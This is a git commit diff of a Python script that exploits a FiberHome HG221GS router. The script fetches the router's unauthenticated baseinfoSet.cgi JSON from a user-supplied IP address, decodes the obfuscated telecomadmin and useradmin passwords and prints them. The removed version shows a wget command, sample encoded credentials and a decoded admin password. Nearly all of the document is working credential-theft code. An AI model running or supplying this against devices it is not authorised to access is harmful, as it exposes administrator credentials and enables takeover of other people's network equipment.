ae5e8e0ad82c9cb9e524f14dc6d494d42d4dbb95
Hilton Chain <26847027+rakino@users.noreply.github.com>
2020-08-31 16:29:16 +0800

    updated

--- fibercat-decoder.py
+++ fibercat-decoder.py
@@ -1,25 +1,32 @@
-'''
-a program to decode FiberHome HG221GS FiberCat telecomadmin password 
-wget http://192.168.1.1/cgi-bin/baseinfoSet.cgi
+from urllib.request import urlopen
+import json
 
-"baseinfoSet_TELECOMACCOUNT":"telecomadmin",
-"baseinfoSet_TELECOMPASSWORD":"114&73&55&110&69&37&53&113&",
-"baseinfoSet_USERACCOUNT":"useradmin",
-"baseinfoSet_USERPASSWORD":"57&71&72&50&76&",
+def passwd_decode(code) -> str: 
+    passwd_list = map(int, code.split('&'))
+    result=[]
+    for i in passwd_list:
+        '''Use this at your own risk!'''
+        if i <= 57 or i >= 110 and i < 120:
+            pass
+        if i >= 100 and i < 110 or i == 120:
+            i -= 4
+        if i > 57 and i < 100:
+            i += 22
 
-设备类型	EPON
-生产厂家	FiberHome
-设备型号:	HG221GS
-硬件版本号:	HS.V2.0
-软件版本号:	E60D1.00MA000
-'''
-code='114&73&55&110&69&37&53&113&'[:-1]    # "baseinfoSet_TELECOMPASSWORD":"114&73&55&110&69&37&53&113&"
-list=map(int,code.split('&'))
-result=[]
-for i in list:
-	if i > 57:
-		i-=4
-	result.append(chr(i))
-print (''.join(result))    # output password:nE7jA%5m
+        result.append(chr(i))
+        #print(i, chr(i))
+    return (''.join(result))
 
+IP = input("Please input IP address of the router: ")
+URL = f"http://{IP}:8080/cgi-bin/baseinfoSet.cgi"
 
+_ = urlopen(URL)
+data = json.loads(_.read())
+baseinfoSet = data["BASEINFOSET"]
+
+admin = [baseinfoSet["baseinfoSet_TELECOMACCOUNT"],
+         baseinfoSet["baseinfoSet_TELECOMPASSWORD"][:-1]]
+user  = [baseinfoSet["baseinfoSet_USERACCOUNT"],
+         baseinfoSet["baseinfoSet_USERPASSWORD"][:-1]]
+
+print (f"Admin: {admin[0]} ; {passwd_decode(admin[1])}\nUser : {user[0]} ; {passwd_decode(user[1])}")
